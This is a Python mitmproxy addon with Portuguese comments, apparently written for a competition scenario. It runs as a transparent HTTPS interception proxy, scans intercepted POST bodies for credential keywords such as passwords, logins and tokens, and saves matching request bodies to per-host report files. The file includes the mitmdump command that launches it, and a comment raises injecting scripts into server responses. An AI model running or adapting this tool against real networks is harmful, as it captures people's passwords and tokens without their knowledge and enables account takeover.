#!/usr/bin/env python3
"""
MÓDULO DE INTERCEPTAÇÃO HTTPS AVANÇADO (MITM)
--------------------------------------------
Este script utiliza o mitmproxy para interceptar e analisar tráfego HTTPS.
Em um cenário de concurso, ele atua como um proxy transparente para capturar
dados de aplicações que utilizam conexões seguras.

Requer: mitmproxy instalado e redirecionamento de tráfego via iptables.
"""

import logging
from mitmproxy import http
from mitmproxy import ctx

# Configuração de Logging Profissional
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    filename="logs/https_intercept.log"
)

class HTTPSAuditor:
    """Script de extensão para o mitmproxy"""

    def request(self, flow: http.HTTPFlow) -> None:
        """Processa requisições enviadas pelos usuários"""
        # Logar o acesso a sites HTTPS
        host = flow.request.pretty_host
        method = flow.request.method
        url = flow.request.pretty_url
        
        ctx.log.info(f"[HTTPS REQ] {method} {host}")
        
        # 1. Detecção de Credenciais em requisições POST (mesmo em HTTPS)
        if method == "POST":
            content = flow.request.get_text()
            keywords = ["user", "pass", "login", "email", "senha", "token"]
            if any(key in content.lower() for key in keywords):
                ctx.log.warn(f"[ALERTA] Possíveis credenciais HTTPS interceptadas de {host}!")
                self._save_sensitive_data(host, content)

    def response(self, flow: http.HTTPFlow) -> None:
        """Processa respostas recebidas dos servidores"""
        # Aqui poderíamos injetar scripts ou analisar o conteúdo da resposta
        pass

    def _save_sensitive_data(self, host: str, data: str):
        """Salva dados sensíveis em arquivo para o relatório final"""
        import os
        from datetime import datetime
        os.makedirs("resources/reports/https", exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"resources/reports/https/intercepted_{host}_{timestamp}.txt"
        with open(filename, "w") as f:
            f.write(data)

# Para executar este script com o mitmproxy:
# mitmdump -s wifi_mitm_proxy.py --mode transparent
addons = [
    HTTPSAuditor()
]
